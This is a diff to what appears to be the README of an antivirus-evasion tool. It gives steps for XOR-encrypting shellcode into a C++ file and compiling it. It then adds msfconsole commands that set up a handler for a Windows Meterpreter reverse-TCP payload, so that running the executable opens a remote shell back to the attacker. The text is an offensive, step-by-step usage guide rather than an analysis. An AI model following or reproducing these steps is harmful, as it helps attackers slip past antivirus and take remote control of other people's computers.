@@ -12,7 +12,16 @@ $ ./jod.sh
 The final shellcode will be XOR Encrypted inside jod_output.txt. We will copy it and paste it in the Evasion.cpp file inside the char b[] = { Xored Shellcode };
 Now compile it using DevC++. 
 
-Run the executable and wait for few seconds.
+Time to setup msfconsole..
+$ msfconsole
+msf > use exploit/multi/handler
+msf > set PAYLOAD windows/x64/meterpreter_reverse_tcp
+msf > set LHOST  [The IP you selected while generating the payload]
+msf > set LPORT [The PORT you selected while generating the payload]
+msf > exploit
+
+
+Now Run the executable and wait for few seconds.
 
 METERPRETER SHELL WILL POP UP. 
 
